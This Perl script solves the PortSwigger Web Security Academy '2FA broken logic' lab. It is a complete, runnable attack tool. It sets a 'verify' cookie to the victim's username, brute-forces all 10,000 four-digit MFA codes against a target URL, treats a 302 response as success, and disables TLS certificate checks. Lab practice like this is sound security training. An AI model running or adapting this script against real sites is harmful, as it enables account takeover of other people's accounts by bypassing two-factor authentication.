#!/usr/bin/env perl
#
#   Author: <wexe1@protonmail.com>
#   License: MIT
#
use strict;
use warnings;
use LWP::UserAgent;
use HTTP::CookieJar::LWP;
use URI::Encode qw(uri_encode);
use Getopt::Long;
use Pod::Usage;
use feature 'say';
use Term::ANSIColor;

BEGIN {
    say colored("PortSwigger Web Security Academy", "bold yellow");
    say colored("Lab: 2FA broken logic", "bold yellow");
    say colored("Solution by weXe1", "bold blue");
    print "\n";
}

our $| = 1;

our(
    $url,
    $proxy,
    $username,
    $help,
);

$username = 'carlos';

GetOptions(
    'u|url=s'           => \$url,
    'p|proxy=s'         => \$proxy,
    'h|help'            => \$help
);

pod2usage(1) if $help;
pod2usage(1) unless $url;

our $ua = LWP::UserAgent->new(
    cookie_jar  => HTTP::CookieJar::LWP->new(),
    protocols_allowed   => ['http', 'https']
);
$ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);

if ($proxy) {
    $ua->proxy('https' => $proxy);
    $ua->proxy('http' => $proxy);
}

$ua->get($url, 'Cookie' => "verify=$username");

say colored("[*] Obtaining 2FA code for user '$username', this may take a while...", "cyan");

for (my $code = 0; $code <= 9999; $code++) {
    if (length($code) < 4) {
        $code = '0' x (4 - length($code)) . $code;
    }
    if (&makeRequest($code)) {
        say colored("[+] Found: $code" , "green");
        exit;
    }
}

say colored("[-] Cannot obtain 2FA code", "red");

sub makeRequest {
    my $code = shift;
    my $response = $ua->post($url, {'mfa-code' => $code}, 'Cookie' => "verify=$username");

    if ($response->status_line =~ /302 found/i) {
        return 1;
    } elsif (!$response->is_success) {
        say STDERR colored($response->status_line, "on_red");
        return 0;
    }
    return 0;
}

__END__

=head1 SYNOPSIS

 $ perl 2fa-broken-logic.pl [options]

=head1 OPTIONS

     --url=<URL>                Target URL of the lab (required)
     --proxy=<URL>              HTTP or HTTPS proxy URL (optional)
     --help                     Prints this help and exit

=cut